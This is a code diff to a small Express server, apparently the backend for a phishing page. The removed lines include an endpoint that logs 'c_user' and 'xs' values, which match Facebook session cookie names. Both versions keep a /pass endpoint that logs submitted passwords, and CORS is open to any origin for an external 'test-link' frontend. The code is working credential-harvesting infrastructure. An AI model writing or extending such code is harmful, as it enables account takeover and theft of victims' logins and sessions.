@@ -3,25 +3,20 @@ const cors = require('cors');
 
 const app = express();
 
-app.use(cors()); // Allow all origins — or configure it
+// ✅ Allow all origins (or replace with your specific frontend URL for security)
+app.use(cors({
+  origin: '*', // Or: 'https://test-link-alpha.vercel.app'
+}));
 
 app.use(express.json());
 
-app.post('/submit', (req, res) => {
-  const { c_user, xs } = req.body;
-  console.log("Data from /submit:", { c_user, xs });
-  res.status(200).json({ success: true });
-});
-
+// Example POST handler
 app.post('/pass', (req, res) => {
-  const { password } = req.body;
-  console.log("Password from /pass:", password);
-  res.status(200).json({ success: true });
+  console.log('Received password:', req.body.password);
+  res.status(200).json({ message: 'Password received' });
 });
 
-app.get('/', (req, res) => {
-  res.send('✅ Backend is running.');
+// Start the server
+app.listen(3000, () => {
+  console.log('Server is running on port 3000');
 });
-
-app.get('/favicon.ico', (req, res) => res.status(204).end()); // Optional
-module.exports = app;
